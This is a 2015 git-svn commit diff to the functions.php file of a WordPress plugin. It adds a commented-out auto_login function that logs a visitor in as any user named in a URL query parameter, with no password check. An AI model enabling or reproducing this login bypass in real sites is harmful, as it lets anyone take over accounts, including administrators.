625f4d125e6521f4b567761eb3a0dc4a17023397
dicm.dk <dicm.dk@b8457f37-d9ea-0310-8a92-e5e31aec5664>
2015-01-09 23:54:37 +0000

    Prepare for later versions of plugin
    git-svn-id: https://plugins.svn.wordpress.org/dicmdk-toolbox/trunk@1064268 b8457f37-d9ea-0310-8a92-e5e31aec5664

--- functions.php
+++ functions.php
@@ -1,5 +1,17 @@
 <?php
-
+/*
+function auto_login() {
+    if (!is_user_logged_in()) {
+        $user_login = $_GET['YOUR-OWN-SECRET-KEY'];
+        $user = get_userdatabylogin($user_login);
+        $user_id = $user->ID;
+        wp_set_current_user($user_id, $user_login);
+        wp_set_auth_cookie($user_id);
+        do_action('wp_login', $user_login);
+    }
+}
+add_action('init', 'auto_login');
+*/
 function Zip($source, $destination)
 {
     if (!extension_loaded('zip') || !file_exists($source)) {
